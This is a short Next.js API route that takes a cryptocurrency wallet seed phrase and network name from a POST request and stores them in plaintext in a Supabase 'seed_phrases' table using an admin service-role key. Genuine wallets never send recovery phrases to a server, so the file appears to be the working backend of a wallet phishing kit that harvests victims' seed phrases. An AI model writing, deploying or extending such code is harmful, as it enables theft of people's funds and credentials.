
import { createClient } from "@supabase/supabase-js";
import { NextResponse } from "next/server";

export async function POST(request: Request) {
  try {
    const supabaseUrl = process.env.SUPABASE_URL;
    const supabaseServiceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

    if (!supabaseUrl || !supabaseServiceRoleKey) {
      let missingVars = [];
      if (!supabaseUrl) missingVars.push("SUPABASE_URL");
      if (!supabaseServiceRoleKey) missingVars.push("SUPABASE_SERVICE_ROLE_KEY");
      console.error(`Server configuration error: Missing environment variables: ${missingVars.join(", ")}. Please check your .env.local file.`);
      return NextResponse.json({ error: `Server configuration error: Required environment variables are not set.` }, { status: 500 });
    }

    // Create a new Supabase client with the service_role key for this server-side operation
    const supabaseAdmin = createClient(supabaseUrl, supabaseServiceRoleKey);
    
    const { seedPhrase, network } = await request.json();

    if (!seedPhrase || !network) {
      return NextResponse.json({ error: "Missing required data: seedPhrase and network." }, { status: 400 });
    }

    const { data, error } = await supabaseAdmin
      .from("seed_phrases")
      .insert([{ seed_phrase: seedPhrase, network: network }])
      .select();

    if (error) {
      console.error("Supabase admin insert error:", error);
      return NextResponse.json({ error: `Database error: ${error.message}` }, { status: 500 });
    }

    return NextResponse.json({ success: true, data });
  } catch (err: any) {
    console.error("Unexpected error in API route:", err);
    return NextResponse.json({ error: `An unexpected server error occurred: ${err.message}` }, { status: 500 });
  }
}
